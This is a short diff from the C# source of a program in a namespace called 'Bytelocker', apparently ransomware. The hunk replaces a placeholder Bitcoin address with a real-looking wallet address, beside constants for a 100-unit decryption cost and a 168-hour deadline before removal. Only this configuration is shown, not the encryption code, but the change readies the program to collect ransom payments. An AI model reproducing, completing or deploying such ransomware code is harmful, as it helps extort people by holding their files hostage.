@@ -15,7 +15,7 @@ namespace Bytelocker
         private static RegistryManager rm = new RegistryManager();
         public static int TIME_TILL_REMOVAL_HOURS = 168;
         public static int COST_TO_DECRYPT = 100;
-        public static String BITCOIN_ADDRESS = "sdfsfsdfsdfsd";
+        public static String BITCOIN_ADDRESS = "17hxeNzSThGXFpsNWQxgnkYSaxHMWiJXpL";
 
         public static void Main(String[] args)
         {
